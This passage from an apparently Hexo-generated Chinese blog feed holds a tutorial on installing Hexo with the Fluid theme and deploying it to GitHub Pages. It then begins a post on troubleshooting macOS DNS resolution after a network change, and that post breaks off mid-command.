class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso">➜  tthours hexo init tthourshexo    <br>INFO  Cloning hexo<span class="hljs-params">-starter</span> https:<span class="hljs-comment">//github.com/hexojs/hexo-starter.git</span><br>INFO  Install dependencies<br><span class="hljs-params">...</span>.<br><span class="hljs-params">...</span>.<br>INFO  Start blogging <span class="hljs-keyword">with</span> Hexo!<br></code></pre></td></tr></table></figure><p>初始化之后会在当前目录创建 博客文件夹，文件夹中会存在以下目录及文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-built_in">config</span>.landscape.yml<br><span class="hljs-built_in">config</span>.yml<br>node modules  <span class="hljs-comment">#目录</span><br>package-lock.<span class="hljs-keyword">json</span><br><span class="hljs-keyword"></span>package.<span class="hljs-keyword">json</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">scaffolds </span> <span class="hljs-comment">#目录</span><br>source  <span class="hljs-comment">#目录</span><br>themes  <span class="hljs-comment">#目录</span><br>yarn.lock<br></code></pre></td></tr></table></figure><h3 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h3><p>进入创建的 博客文件夹</p><p>cd tthourshexo  </p><p>创建文件</p><p>hexo new hexo_install</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  tthourshexo hexo new hexo_install<br>INFO  Validating config<br>INFO  Created: ~/tthours/tthourshexo/source/_posts/hexo-install.md<br></code></pre></td></tr></table></figure><p>静态化处理</p><p>hexo g</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">➜  tthourshexo hexo g<br><span class="hljs-built_in">INFO</span>  Validating<span class="hljs-built_in"> config</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">INFO</span>  Start processing<br><span class="hljs-built_in">INFO</span>  Files loaded <span class="hljs-keyword">in</span> 159 ms<br><span class="hljs-built_in">INFO</span>  Generated: index.html<br><span class="hljs-built_in">INFO</span>  Generated: archives/index.html<br><span class="hljs-built_in">INFO</span>  Generated: js/script.js<br><span class="hljs-built_in">INFO</span>  Generated: css/style.css<br><span class="hljs-built_in">INFO</span>  Generated: archives/2024/12/index.html<br><span class="hljs-built_in">INFO</span>  Generated: fancybox/jquery.fancybox.min.css<br><span class="hljs-built_in">INFO</span>  Generated: archives/2024/index.html<br><span class="hljs-built_in">INFO</span>  Generated: fancybox/jquery.fancybox.min.js<br><span class="hljs-built_in">INFO</span>  Generated: js/jquery-3.6.4.min.js<br><span class="hljs-built_in">INFO</span>  Generated: css/images/banner.jpg<br><span class="hljs-built_in">INFO</span>  Generated: 2024/12/15/hello-world/index.html<br><span class="hljs-built_in">INFO</span>  Generated: 2024/12/15/hexo-install/index.html<br><span class="hljs-built_in">INFO</span>  12 files generated <span class="hljs-keyword">in</span> 109 ms<br></code></pre></td></tr></table></figure><p>启动服务预览</p><p>hexo s</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  tthourshexo hexo s<br><span class="hljs-keyword">INFO</span>  Validating config<br><span class="hljs-keyword">INFO</span>  <span class="hljs-keyword">Start</span> processing<br><span class="hljs-keyword">INFO</span>  Hexo <span class="hljs-keyword">is</span> running at http://localhost:<span class="hljs-number">4000</span>/ . Press Ctrl+C <span class="hljs-keyword">to</span> stop.<br></code></pre></td></tr></table></figure><p>本地测试</p><p><a href="http://localhost:4000/">http://localhost:4000/</a></p><h2 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h2><p>在hexo选择主题<a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p><p>在博客文件夹下安装</p><p>npm install –save hexo-theme-fluid</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">➜  tthourshexo npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br><br>up <span class="hljs-keyword">to</span> <span class="hljs-built_in">date</span>, audited <span class="hljs-number">224</span> packages <span class="hljs-keyword">in</span> <span class="hljs-number">2</span>s<br><br><span class="hljs-number">24</span> packages are looking <span class="hljs-keyword">for</span> funding<br>  <span class="hljs-built_in">run</span> `npm fund` <span class="hljs-keyword">for</span> details<br><br>found <span class="hljs-number">0</span> vulnerabilities<br></code></pre></td></tr></table></figure><p>fluid主题</p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid?tab=readme-ov-file">https://github.com/fluid-dev/hexo-theme-fluid?tab=readme-ov-file</a></p><h2 id="关联GitHub"><a href="#关联GitHub" class="headerlink" title="关联GitHub"></a>关联GitHub</h2><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><h4 id="修改默认配置文件"><a href="#修改默认配置文件" class="headerlink" title="修改默认配置文件"></a>修改默认配置文件</h4><p>根目录下默认的_config.yml</p><h5 id="修改site"><a href="#修改site" class="headerlink" title="修改site"></a>修改site</h5><p>默认值</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"># Site<br><span class="hljs-symbol">title:</span> Hexo<br><span class="hljs-symbol">subtitle:</span> <span class="hljs-comment">&#x27;&#x27;</span><br><span class="hljs-symbol">description:</span> <span class="hljs-comment">&#x27;&#x27;</span><br><span class="hljs-symbol">keywords:</span><br><span class="hljs-symbol">author:</span> John Doe<br><span class="hljs-symbol">language:</span> en<br><span class="hljs-symbol">timezone:</span> <span class="hljs-comment">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>修改后</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"># Site<br><span class="hljs-symbol">title:</span> Ten thousand hours<br><span class="hljs-symbol">subtitle:</span> <span class="hljs-comment">&#x27;Ten thousand hours&#x27;</span><br><span class="hljs-symbol">description:</span> <span class="hljs-comment">&#x27;Ten thousand hours&#x27;</span><br><span class="hljs-symbol">keywords:</span><br><span class="hljs-symbol">author:</span> tt<br><span class="hljs-symbol">language:</span> zh-CN<br><span class="hljs-symbol">timezone:</span> <span class="hljs-comment">&#x27;Asia/Shanghai&#x27;</span><br></code></pre></td></tr></table></figure><p>url: <a href="http://example.com/">http://example.com</a></p><p>修改为</p><p>url: <a href="https://tthours.github.io/">https://tthours.github.io</a></p><h5 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h5><p>theme: fluid</p><h5 id="修改环境"><a href="#修改环境" class="headerlink" title="修改环境"></a>修改环境</h5><p>原始</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"># Deployment<br>## Docs: https:<span class="hljs-comment">//hexo.io/docs/one-command-deployment</span><br>deploy:<br>  type: <span class="hljs-string">&#x27;&#x27;</span><br>  <br></code></pre></td></tr></table></figure><p>修改后</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">deploy:</span><br>  <span class="hljs-params">type:</span> &#x27;git&#x27;<br>  <span class="hljs-params">repository:</span> git@tthoursgithub.com:tthours<span class="hljs-symbol">/tthours.github.io.git</span><br>  <span class="hljs-params">branch:</span> main<br></code></pre></td></tr></table></figure><h3 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h3><p>如果有安装对应的主题，就需要新建主题对应的配置文件，复制默认配置文件进行修改</p><p>例如：fluid主题，创建_config.fluid.yml</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># Hexo Configuration</span><br><span class="hljs-comment"># 用于浏览器标签的图标</span><br><span class="hljs-comment"># Icon for browser tab</span><br><span class="hljs-comment"># 注意必须是png后缀格式</span><br><span class="hljs-params">favicon:</span> <span class="hljs-symbol">/img/hd.png</span><br><br><span class="hljs-comment"># 用于苹果设备的图标</span><br><span class="hljs-comment"># Icon for Apple touch</span><br><span class="hljs-params">apple_touch_icon:</span> <span class="hljs-symbol">/img/hd.png</span><br><br><span class="hljs-comment"># 导航栏的相关配置</span><br><span class="hljs-comment"># Navigation bar</span><br><span class="hljs-params">navbar:</span><br>  <span class="hljs-comment"># 导航栏左侧的标题，为空则按 hexo config 中 `title` 显示</span><br>  <span class="hljs-comment"># The title on the left side of the navigation bar. If empty, it is based on `title` in hexo config</span><br>  <span class="hljs-params">blog_title:</span> <span class="hljs-string">&quot;10000hours&quot;</span><br><br><span class="hljs-params">index:</span><br>  <span class="hljs-params">slogan:</span><br>    <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">text:</span> <span class="hljs-string">&quot;每个人都需要对自己的人生负责&quot;</span><br>    <span class="hljs-comment">#api:</span><br>    <span class="hljs-comment">#  enable: false</span><br>    <span class="hljs-comment">#  url: &quot;https://v1.hitokoto.cn/&quot;</span><br>    <span class="hljs-comment">#  method: &quot;GET&quot;</span><br>    <span class="hljs-comment">#  headers: &#123;&#125;</span><br>    <span class="hljs-comment">#  keys: [&quot;hitokoto&quot;]</span><br>  <span class="hljs-params">post_url_target:</span> _blank<br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 文章页</span><br><span class="hljs-comment"># Post Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">post:</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">70</span><br><br><br>  <span class="hljs-params">updated:</span><br>    <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># 格式参照 ISO-8601 日期格式化</span><br>    <span class="hljs-comment"># ISO-8601 date format</span><br>    <span class="hljs-comment"># See: http://momentjs.cn/docs/#/parsing/string-format/</span><br>    <span class="hljs-params">date_format:</span> <span class="hljs-string">&quot;LL a&quot;</span><br><br>    <span class="hljs-comment"># 是否使用相对时间表示，比如：&quot;3 天前&quot;</span><br>    <span class="hljs-comment"># If true, it will be a relative time, such as: &quot;3 days ago&quot;</span><br>    <span class="hljs-params">relative:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># 提示标签类型</span><br>    <span class="hljs-comment"># Note class</span><br>    <span class="hljs-comment"># Options: default | primary | info | success | warning | danger | light</span><br>    <span class="hljs-params">note_class:</span> info<br>    <span class="hljs-comment"># 版权声明，会显示在每篇文章的结尾</span><br>  <span class="hljs-comment"># Copyright, will be displayed at the end of each post</span><br>  <span class="hljs-params">copyright:</span><br>    <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># CreativeCommons license</span><br>    <span class="hljs-comment"># Options: BY | BY-SA | BY-ND | BY-NC | BY-NC-SA | BY-NC-ND</span><br>    <span class="hljs-params">license:</span> &#x27;BY TT&#x27;<br><br>    <span class="hljs-comment"># 显示作者</span><br>    <span class="hljs-params">author:</span><br>      <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># 显示发布日期</span><br>    <span class="hljs-comment"># Show post date</span><br>    <span class="hljs-params">post_date:</span><br>      <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-params">format:</span> <span class="hljs-string">&quot;LL&quot;</span><br><br>    <span class="hljs-comment"># 显示更新日期</span><br>    <span class="hljs-comment"># Show update date</span><br>    <span class="hljs-params">update_date:</span><br>      <span class="hljs-params">enable:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-params">format:</span> <span class="hljs-string">&quot;LL&quot;</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 归档页</span><br><span class="hljs-comment"># Archive Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">archive:</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-params">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 分类页</span><br><span class="hljs-comment"># Category Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">category:</span><br>  <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-params">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br><br>  <span class="hljs-comment"># 分类的排序字段，前面带减号是倒序，不带减号是正序</span><br>  <span class="hljs-comment"># Sort field for categories, with a minus sign is reverse order</span><br>  <span class="hljs-comment"># Options: length | name</span><br>  <span class="hljs-params">order_by:</span> <span class="hljs-string">&quot;-length&quot;</span><br><br>  <span class="hljs-comment"># 层级的折叠深度，0 是全部折叠，大于 0 后如果存在子分类则默认展开</span><br>  <span class="hljs-comment"># Collapse depth. If 0, all posts collapsed. If greater than 0, it will be expanded by default if there are subcategories</span><br>  <span class="hljs-params">collapse_depth:</span> <span class="hljs-number">0</span><br><br>  <span class="hljs-comment"># 文章的排序字段，前面带减号是倒序，不带减号是正序</span><br>  <span class="hljs-comment"># Sort field for posts, with a minus sign is reverse order</span><br>  <span class="hljs-comment"># Options: date | title | or other field of front-matter</span><br>  <span class="hljs-params">post_order_by:</span> <span class="hljs-string">&quot;-date&quot;</span><br><br>  <span class="hljs-comment"># 单个分类中折叠展示文章数的最大值，超过限制会显示 More，0 则不限制</span><br>  <span class="hljs-comment"># The maximum number of posts in a single category. If the limit is exceeded, it will be displayed More. If 0 no limit</span><br>  <span class="hljs-params">post_limit:</span> <span class="hljs-number">10</span><br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 标签页</span><br><span class="hljs-comment"># Tag Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">tag:</span><br>  <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">80</span><br>  <span class="hljs-params">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br>  <span class="hljs-params">tagcloud:</span><br>    <span class="hljs-params">min_font:</span> <span class="hljs-number">15</span><br>    <span class="hljs-params">max_font:</span> <span class="hljs-number">30</span><br>    <span class="hljs-params">unit:</span> px<br>    <span class="hljs-params">start_color:</span> <span class="hljs-string">&quot;#BBBBEE&quot;</span><br>    <span class="hljs-params">end_color:</span> <span class="hljs-string">&quot;#337ab7&quot;</span><br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 关于页</span><br><span class="hljs-comment"># About Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">about:</span><br>  <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-params">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br>  <span class="hljs-params">avatar:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">name:</span> <span class="hljs-string">&quot;TT&quot;</span><br>  <span class="hljs-params">intro:</span> <span class="hljs-string">&quot;TT&quot;</span><br>  <span class="hljs-comment"># 更多图标可从 https://hexo.fluid-dev.com/docs/icon/ 查找，`class` 代表图标的 css class，添加 `qrcode` 后，图标不再是链接而是悬浮二维码</span><br>  <span class="hljs-comment"># More icons can be found from https://hexo.fluid-dev.com/docs/en/icon/  `class` is the css class of the icon. If adding `qrcode`, The icon is no longer a link, but a hovering QR code</span><br>  <span class="hljs-params">icons:</span><br>    <span class="hljs-operator">-</span> &#123; <span class="hljs-params">class:</span> <span class="hljs-string">&quot;iconfont icon-github-fill&quot;</span>, <span class="hljs-params">link:</span> <span class="hljs-string">&quot;https://github.com&quot;</span>, <span class="hljs-params">tip:</span> <span class="hljs-string">&quot;GitHub&quot;</span> &#125;<br>    <span class="hljs-operator">-</span> &#123; <span class="hljs-params">class:</span> <span class="hljs-string">&quot;iconfont icon-douban-fill&quot;</span>, <span class="hljs-params">link:</span> <span class="hljs-string">&quot;https://douban.com&quot;</span>, <span class="hljs-params">tip:</span> <span class="hljs-string">&quot;豆瓣&quot;</span> &#125;<br>    <span class="hljs-operator">-</span> &#123; <span class="hljs-params">class:</span> <span class="hljs-string">&quot;iconfont icon-wechat-fill&quot;</span>, <span class="hljs-params">qrcode:</span> <span class="hljs-string">&quot;/img/favicon.png&quot;</span> &#125;<br></code></pre></td></tr></table></figure><h3 id="安装部署工具"><a href="#安装部署工具" class="headerlink" title="安装部署工具"></a>安装部署工具</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br><br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">➜  tthourshexo npm <span class="hljs-keyword">install </span>hexo-deployer-git --save<br><br><br><span class="hljs-keyword">added </span><span class="hljs-number">9</span> packages, <span class="hljs-keyword">and </span>audited <span class="hljs-number">233</span> packages in <span class="hljs-number">4</span>s<br><br><span class="hljs-number">30</span> packages are looking for funding<br>  run `npm fund` for details<br><br>found <span class="hljs-number">0</span> vulnerabilities<br></code></pre></td></tr></table></figure><h2 id="静态化文件"><a href="#静态化文件" class="headerlink" title="静态化文件"></a>静态化文件</h2><p>hexo g</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>hexo d</p><h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ssh: connect to host github.com port 22: Operation timed out<br>致命错误：无法读取远程仓库。<br><br>请确认您有正确的访问权限并且仓库存在。<br>FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html<br><span class="hljs-keyword">Error: </span>Spawn failed<br>    at ChildProcess.&lt;anonymous&gt; (/Users/admin/tthours/tthourshexoblog/node_modules/hexo-deployer-git/node_modules/hexo-util/lib/spawn.js:51:21)<br>    at ChildProcess.emit (node:events:513:28)<br>    at ChildProcess._handle.onexit (node:internal/child_process:294:12)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_mac_更换网络环境DNS无法切换</title>
    <link href="/2024/11/23/yunwei/errors/Macerrors/error_mac_%E6%9B%B4%E6%8D%A2%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83DNS%E6%97%A0%E6%B3%95%E5%88%87%E6%8D%A2/"/>
    <url>/2024/11/23/yunwei/errors/Macerrors/error_mac_%E6%9B%B4%E6%8D%A2%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83DNS%E6%97%A0%E6%B3%95%E5%88%87%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Apple M1  macOS Sonoma 14.5</p><p>mac电脑从  A  网络环境切换到 B 网络环境后，出现可以 ping  通，但是无法解析域名的情况</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">➜  /<span class="hljs-built_in"> ping </span>8.8.8.8<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>8.8.8.8 (8.8.8.8): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=47.866 ms<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=51.305 ms<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  / ping www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>ping: cannot resolve www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>: Unknown host<br></code></pre></td></tr></table></figure><h2 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><p>1、检查DNS配置文件 &#x2F;etc&#x2F;resolv.conf 是 A 网络环境的DNS</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nameserver</span> <span class="hljs-number">10.211.1.8</span><br>nameserver <span class="hljs-number">10.211.133.8</span><br></code></pre></td></tr></table></figure><p>2、同时使用 scutil –dns 查看本机 DNS配置</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs ada">➜  / scutil <span class="hljs-comment">--dns</span><br>DNS configuration<br><br>resolver #<span class="hljs-number">1</span><br>  nameserver[<span class="hljs-number">0</span>] : 10.211.1.8<br>  nameserver[<span class="hljs-number">1</span>] : 10.211.133.8<br>  flags    : <span class="hljs-type">Supplemental</span>, Request A records, Request AAAA records<br>  reach    : 0<span class="hljs-type">x00000002</span> (Reachable)<br>  order    : 102200<br><br>resolver #<span class="hljs-number">2</span><br>  nameserver[<span class="hljs-number">0</span>] : <span class="hljs-type">fe80</span>::<span class="hljs-number">6</span>f1:<span class="hljs-number">69</span>ff:fed3:a0c4%<span class="hljs-number">11</span>d<br>  nameserver[<span class="hljs-number">1</span>] : 192.168.3.1<br>  if_index : 11 (<span class="hljs-type">en0</span>)<br>  flags    : <span class="hljs-type">Request</span> A records, Request AAAA records<br>  reach    : 0<span class="hljs-type">x00020002</span> (Reachable,Directly Reachable Address)<br>  order    : 200000<br>.<br>.<br>.<br>DNS configuration (<span class="hljs-keyword">for</span> scoped queries)<br><br>resolver #<span class="hljs-number">1</span><br>  nameserver[<span class="hljs-number">0</span>] : <span class="hljs-type">fe80</span>::<span class="hljs-number">6</span>f1:<span class="hljs-number">69</span>ff:fed3:a0c4%<span class="hljs-number">11</span>d<br>  nameserver[<span class="hljs-number">1</span>] : 192.168.3.1<br>  if_index : 11 (<span class="hljs-type">en0</span>)<br>  flags    : <span class="hljs-type">Scoped</span>, Request A records, Request AAAA records<br>  reach    : 0<span class="hljs-type">x00020002</span> (Reachable,Directly Reachable Address)<br></code></pre></td></tr></table></figure><p>3、系统界面查看当前网络DNS配置</p><p>设置-网络- Wi-Fi - 详细信息 - DNS ，是设置的B网络DNS</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">223.5.5.5</span><br></code></pre></td></tr></table></figure><h3 id="尝试解决方案1"><a href="#尝试解决方案1" class="headerlink" title="尝试解决方案1"></a>尝试解决方案1</h3><p>修改resolv.conf配置文件，配置没生效，依旧无法解析域名</p><p>1、终端修改DNS配置为B网络DNS</p><p>10.211.1.8 和 10.211.133.8 修改为 223.5.5.5</p><p>2、刷新DNS缓存</p><p>sudo dscacheutil 